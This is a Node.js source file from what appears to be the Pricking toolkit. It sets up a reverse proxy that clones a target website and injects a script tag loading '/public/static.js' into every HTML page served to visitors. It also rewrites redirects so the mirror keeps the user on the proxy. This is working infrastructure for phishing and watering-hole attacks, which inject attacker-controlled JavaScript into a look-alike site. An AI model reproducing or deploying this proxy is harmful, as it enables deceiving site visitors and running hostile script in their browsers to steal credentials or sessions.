/*
    https://github.com/Rvn0xsy/Pricking
    //////////////////////////////////////////////////
    $ npm install -g express
    $ npm install -g http-proxy-middleware
    $ node proxy.js
    //////////////////////////////////////////////////
    默认值：
    * 监听端口：3000
    * 静态文件目录：pricking-js-suite
    * 静态文件URI：/public
    * 反向代理目标：https://payloads.online
*/

const express = require('express');
const { createProxyMiddleware,responseInterceptor } = require('http-proxy-middleware');

// 不做处理的静态文件内容
const staticTypes = ['image/png', 'image/jpg', 'image/jpeg', 'image/gif','image/x-icon','image/bmp','application/javascript','text/plain','audio/ogg','video/mp4','application/xml'];
const saveTypes = ['application/pdf',]
const app = express();
const injectBody = '<script src="/public/static.js" type="module"></script>'

// 默认端口 3000
const gtargetHost = process.env.HOST == undefined?'https://payloads.online':process.env.HOST
const glistenPort = process.env.PORT == undefined?3000:process.env.PORT
const gpublicUri  = process.env.PUBLIC_URI == undefined?'/public':process.env.PUBLIC_URI
const gpublicDir  = process.env.PUBLIC_DIR == undefined?'pricking-js-suite':process.env.PUBLIC_DIR

// 静态文件目录
app.use(gpublicUri, express.static(gpublicDir));

app.use('/', createProxyMiddleware({
    target: gtargetHost, 
    changeOrigin: true,
    selfHandleResponse: true,
    onProxyReq(proxyReq, req, res) {  
        // proxyReq.setHeader('Proxy-By', 'Pricking');
    },
    onProxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {

        // 处理跳转
        if(res.statusCode == 302){
            newLocation = res.getHeader("location").replace(gtargetHost,"")
            if (newLocation.indexOf("/") != 0){
                newLocation+="/"
            }
            res.setHeader("location",newLocation)
        }

        // 忽略静态资源
        if (staticTypes.includes(proxyRes.headers['content-type'])) {
            return responseBuffer;
        }

        // 对HTML文件进行注入
        if(/text\/html/i.test(proxyRes.headers['content-type'])){
            const response = responseBuffer.toString('utf8');
            return response.replace('</body>', injectBody + '</body>');
        }

        return responseBuffer;
    }),
 }));

app.listen(glistenPort);
